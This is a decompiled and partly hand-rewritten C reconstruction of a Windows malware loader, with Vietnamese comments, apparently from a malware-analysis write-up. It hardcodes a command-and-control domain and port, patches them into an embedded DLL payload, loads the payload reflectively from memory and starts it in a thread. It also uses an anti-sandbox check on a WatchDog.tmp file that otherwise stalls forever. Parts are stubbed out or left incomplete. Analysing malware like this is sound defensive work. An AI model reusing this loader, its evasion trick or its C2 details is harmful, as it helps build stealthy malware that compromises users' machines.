/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2019 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
   Raw edit by HTC
*/

#include <windows.h>
#include <stdio.h>

// MemoryModule: download at https://github.com/fancycode/MemoryModule
#include "MemoryModule.h"

//-------------------------------------------------------------------------
// Data declarations

BYTE PE_Embed[] = { 0 /* xxxx: toan bo PE data cua pay.dll*/ };

DWORD g_dwEmbedPE_Size = sizeof(PE_Embed);
static_assert(g_dwEmbedPE_Size == 0x8200);

char g_szCC[] = "charleseedwards.dynamic-dns.net";
char g_szPort[] = "2100";

BOOL __cdecl WatchDogTmp_Not_Existed();
void __stdcall OutputDbgStr_ThreadProc(LPVOID lpThreadParameter);
void __cdecl Sleep_Forever();

int FindStringInEmbedPE(const char *pszKey)
{
    // Chi la vong for tim pszKey trong toan bo data cua PE_Embed
    // Doc gia tu viet lai nhe
    return 1;
}

// Kiem tra file WatchDog.tmp co existed trong thu muc %TEMP%
BOOL __cdecl WatchDogTmp_Not_Existed()
{
    char Buffer[MAX_PATH];   // [esp+0h] [ebp-20Ch]
    char szTmpDir[MAX_PATH]; // [esp+104h] [ebp-108h] OVERLAPPED

    memset(szTmpDir, 0, MAX_PATH);
    GetTempPathA(MAX_PATH, szTmpDir);
    memset(Buffer, 0, sizeof(Buffer));
    sprintf(Buffer, "%s%s", szTmpDir, "WatchDog.tmp");
    return fopen(Buffer, "r") == 0;
}

void ExcecuteProc(char *pszDummy)
{
    int nPos1; // edi
    int nPos2; // eax MAPDST
    LPBYTE hostAddr; // edi
    LPBYTE portAddr; // esi
    MEMORYMODULE *pmod; // eax
    DWORD (__stdcall *p_windows)(LPVOID); // esi
    HMODULE hKernel32; // eax
    HANDLE (__stdcall *CreateThread)(LPVOID, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD); // eax
    HANDLE hThread; // eax
    char szKernel32dll[16]; // [esp+8h] [ebp-30h]
    char szBuf1[12]; // [esp+18h] [ebp-20h]
    char szBuf2[12]; // [esp+24h] [ebp-14h]

    strcpy(szBuf1, "offsethost2");
    strcpy(szBuf2, "offsetport2");
    nPos1 = FindStringInEmbedPE(szBuf1);
    nPos2 = FindStringInEmbedPE(szBuf2);
    if (nPos1 && nPos2)
    {
        hostAddr = (LPBYTE ) &PE_Embed + nPos1;
        memset(hostAddr, 0, 0x64u);
        portAddr = (LPBYTE ) &PE_Embed + nPos2;
        memset(portAddr, 0, 0x64u);
        memcpy(hostAddr, g_szCC, strlen(g_szCC));
        memcpy(portAddr, g_szPort, strlen(g_szPort));
        pmod = ::MemoryLoadLibraryEx();
        if (pmod)
        {
            strcpy(&szBuf1[4], "windows");
            p_windows = ::MemoryGetProcAddress(pmod, &szBuf1[4]);
            strcpy(szKernel32dll, "KERNEL32.dll");
            strcpy(szBuf2, "CreateThread");
            hKernel32 = LoadLibraryA(szKernel32dll);
            CreateThread = GetProcAddress(hKernel32, szBuf2);
            hThread = CreateThread(0, 0, p_windows, 0, 0, 0);
            WaitForSingleObject(hThread, INFINITE);
        }
    }
}

DWORD __stdcall __no_return OutputDbgStr_ThreadProc(LPVOID lpParam)
{
    while (TRUE)
    {
        Sleep(0x3E8u);
        OutputDebugStringA("s");
    }
}

void __cdecl Sleep_Forever()
{
    struct tagPOINT Point; // [esp+4h] [ebp-8h]

    GetCursorPos(&Point);
    if (!Point.x)
    {
        MessageBoxW(0, 0, 0, 0);
    }

    CreateThread(0, 0, OutputDbgStr_ThreadProc, 0, 0, 0);

    while (TRUE)
    {
        Sleep(0xAu);
    }
}

int MainProc(char *pszLogName)
{

    SetUnhandledExceptionFilter(Exception_Execute_Handler);
    if (WatchDogTmp_Not_Existed())
    {
        Sleep_Forever();
    }

    ExcecuteProc(pszLogName);
    return (int)p_szLogName;
}
